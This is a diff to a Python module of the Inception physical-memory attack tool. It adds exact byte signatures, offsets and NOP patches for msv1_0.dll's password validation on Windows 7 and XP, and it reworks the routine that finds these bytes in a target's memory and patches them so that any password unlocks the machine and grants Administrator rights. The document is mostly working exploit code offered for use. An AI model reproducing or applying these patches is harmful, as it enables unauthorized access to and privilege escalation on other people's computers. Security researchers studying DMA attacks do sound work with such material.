@@ -21,7 +21,8 @@ Created on Jun 23, 2011
 
 @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
 '''
-from inception import firewire, cfg, sound, util
+from inception import cfg, sound, util
+from inception.memory import Target, Signature, Chunk
 import os
 import sys
 import time
@@ -29,8 +30,136 @@ import time
 info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
 'this module you should be able to log in with any non-blank password.'
 
+# Target template for copying
+# Target(
+#     name=None,
+#     note=None,
+#     signatures=[
+#         Signature(
+#             os=None,
+#             os_versions=[],
+#             os_architectures=['x86', 'x64'],
+#             executable=None,
+#             version=None,
+#             md5=None,
+#             tag=False,
+#             offsets=[],
+#             chunks=[
+#                 Chunk(
+#                     chunk=None,
+#                     chunkoffset=0x00,
+#                     patch=None,
+#                     patchoffset=0x00)
+#                 ]
+#             )
+#         ]
+#     )
+
+
+targets = [
+Target(
+    name='Windows 7 MsvpPasswordValidate unlock/privilege escalation',
+    note='NOPs out the jump that is called if passwords doesn\'t match. This '
+    'will cause all accounts to no longer require a password, and will also '
+    'allow you to escalate privileges to Administrator via the \'runas\' '
+    'command. Note: As the patch stores the LANMAN/NTLM hash of the entered '
+    'password, the account will be locked out of any Windows AD domain '
+    'he/she was member of at this machine.',
+    signatures=[
+        Signature(
+            os=None,
+            os_versions=['SP0', 'SP1'],
+            os_architectures=['x64'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x2a8, 0x2a1, 0x291, 0x321],
+            chunks=[
+                Chunk(
+                    chunk=0xc60f85,
+                    chunkoffset=0x00,
+                    patch=0x909090909090,
+                    patchoffset=0x01),
+                Chunk(
+                    chunk=0xb8,
+                    chunkoffset=0x07,
+                    patch=None,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os=None,
+            os_versions=['SP0'],
+            os_architectures=['x86'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x926],
+            chunks=[
+                Chunk(
+                    chunk=0x83f8107513b0018b,
+                    chunkoffset=0x00,
+                    patch=0x83f8109090b0018b,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os=None,
+            os_versions=['SP1'],
+            os_architectures=['x86'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x312],
+            chunks=[
+                Chunk(
+                    chunk=0x83f8100f8550940000b0018b,
+                    chunkoffset=0x00,
+                    patch=0x83f810909090909090b0018b,
+                    patchoffset=0x00)
+                ]
+            )
+        ]
+    ),
+Target(
+    name='Windows XP MsvpPasswordValidate unlock/privilege escalation',
+    note='NOPs out the jump that is called if passwords doesn\'t match. '
+    'This will cause all accounts to no longer require a password, and '
+    'will also allow you to escalate privileges to Administrator via the '
+    '\'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of '
+    'the entered password, the account will be locked out of any Windows '
+    'AD domain he/she was member of at this machine.',
+    signatures=[
+        Signature(
+            offsets=[0x862, 0x8aa, 0x946, 0x126, 0x9b6],
+            os='Windows XP',
+            os_versions=['SP2', 'SP3'],
+            os_architectures=['x86'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            chunks=[
+                Chunk(
+                    chunk=0x83f8107511b0018b,
+                    chunkoffset=0x00,
+                    patch=0x83f8109090b0018b,
+                    patchoffset=0x00)
+                ]
+            )
+        ]
+    )
+]
+
+
 def add_options(parser):
-    pass
+    parser.add_option('-l', action='store_true', dest='list_targets',
+        help='list available targets.')
+    parser.add_option('-r', '--revert', action='store_true', 
+        dest='revert', help='revert patch after use.')
 
 
 def select_target(targets, selected=False):
@@ -56,104 +185,39 @@ def select_target(targets, selected=False):
         term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
                   '. Type \'q\' to quit')
         return select_target(targets)
-    
 
-def printdetails(opts): # TODO: Fix this fugly method
-    '''
-    Prints details about a target
-    '''
-    term.info('The target module contains the following signatures:')
-    term.separator()
-    print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
-    print('\tArchitectures:\t' + ', '
-          .join(target['architectures']).rstrip(', '))
-    for signature in target['signatures']:
-        offsets = '\n\t\tOffsets:\t'
-        for offset in signature['offsets']:
-            offsets += hex(offset)
-            if not offset is signature['offsets'][-1]: offsets += ', '
-        print(offsets)
-        sig = '\t\tSignature:\t0x'
-        ioffs = 0
-        patch = 0
-        poffs = 0
-        for chunk in signature['chunks']:
-            diff = chunk['internaloffset'] - util.bytelen(chunk['chunk']) - 1 - ioffs
-            sig += '__' * diff
-            ioffs = chunk['internaloffset']
-            sig += '{0:x}'.format(chunk['chunk'])
-            try:
-                patch = chunk['patch']
-                poffs = chunk['patchoffset']
-            except KeyError: pass
-        print(sig)
-        print('\t\tPatch:\t\t{0:#x}'.format(patch))
-        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
-        
-    term.separator()
     
-    
-def list_targets(targets, details=False):
+def list_targets(details=False):
     term.info('Available targets (known signatures):')
     term.separator()
     for number, target in enumerate(targets, 1):
-                term.info(target['OS'] + ': ' + target['name'], sign = number)
-                if details:
-                    printdetails(target)
-    if not details: # Avoid duplicate separator
-        term.separator()
+        term.info('{0}'.format(target.name), sign=number)
+    if details:
+        term.write(target)
+    term.separator()
 
 
-def run(targets):
+def run(opts, memspace):
     '''
     Main attack logic
     '''
-    # Initialize
-    if not cfg.filemode:
-        try:
-            fw = firewire.FireWire()
-        except IOError:
-            term.fail('Could not initialize FireWire. Are the modules ' +
-                      'loaded into the kernel?')
-        start = time.time()
-        device_index = fw.select_device()
-
-    # List targets
-    list_targets(targets)
+    list_targets(details=opts.verbose)
+    # List targets only?
+    if opts.list_targets:
+        sys.exit(0)
        
-    # Select target
+    # Select target, print selection
     target = select_target(targets)
+    term.info('Selected target: ' + target.name)
     
-    # Print selection. If verbose, print selection with signatures
-    term.info('Selected target: ' + target['OS'] + ': ' + target['name'])
-    if opts.verbose:
-        printdetails(target)
-    
-    # Lower DMA shield or use a file as input, and set memsize
-    device = None
-    memsize = None
-    if cfg.filemode:
-        device = util.MemoryFile(opts.filename, cfg.PAGESIZE)
-        memsize = os.path.getsize(opts.filename)
-    else:
-        elapsed = int(time.time() - start)
-        device = fw.getdevice(device_index, elapsed)
-        memsize = cfg.memsize
-    
-    # Perform parallel search for all signatures for each OS at the known 
-    # offsets
-    term.info('DMA shields should be down by now. Attacking...')
-    address, chunks = searchanddestroy(device, target, memsize)
-    if not address:
-        # TODO: Fall-back sequential search?
-        return None, None
+    address, signature, offset, chunks = memspace.find(target).pop()
     
     # Signature found, let's patch
     mask = 0xfffff000 # Mask away the lower bits to find the page number
     page = int((address & mask) / cfg.PAGESIZE)
     term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    if not cfg.dry_run:
-        success, backup = patch(device, address, chunks)
+    if not opts.dry_run:
+        success, backup = memspace.patch(address, chunks)
         if success:
             if cfg.egg:
                 sound.play('resources/inception.wav')
@@ -163,23 +227,15 @@ def run(targets):
             term.warn('Write-back could not be verified; patching *may* ' +
                       'have been unsuccessful')
 
-        if cfg.revert:
+        if opts.revert:
             term.poll('Press [enter] to revert the patch:')
-            device.write(address, backup)
+            memspace.write(address, backup)
 
-            if backup == device.read(address, cfg.PAGESIZE):
+            if backup == memspace.read(address, cfg.PAGESIZE):
                 term.info('Revert patch verified; successful')
             else:
                 term.warn('Revert patch could not be verified')
-
-    #Clean up
-    device.close()
     
     return address, page
-
-
-def run(opts):
-    fw = firewire.FireWire(opts.delay)
-    fw.businfo()
 
 
